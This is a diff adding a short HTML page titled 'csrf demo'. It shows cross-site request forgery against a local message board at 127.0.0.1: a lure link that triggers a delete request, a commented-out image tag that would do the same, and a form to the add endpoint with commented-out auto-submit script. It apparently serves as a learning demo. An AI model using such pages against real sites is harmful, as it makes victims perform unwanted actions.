@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>csrf demo</title>
+</head>
+<body>
+<a href="http://127.0.0.1:5000/board/delete/6?token=hshuf68d77j3sh67">长得好看是一种怎样的体验?</a>
+<!--<img src="http://127.0.0.1:5000/board/delete/7" alt="">-->
+
+<form action="http://127.0.0.1:5000/board/add" method="post">
+    <input type="text" name="title" value="csrf demo">
+    <button id="add">提交</button>
+</form>
+<script>
+    // var e = selector => document.querySelector(selector)
+    //
+    // e('#add').click()
+</script>
+</body>
+</html>
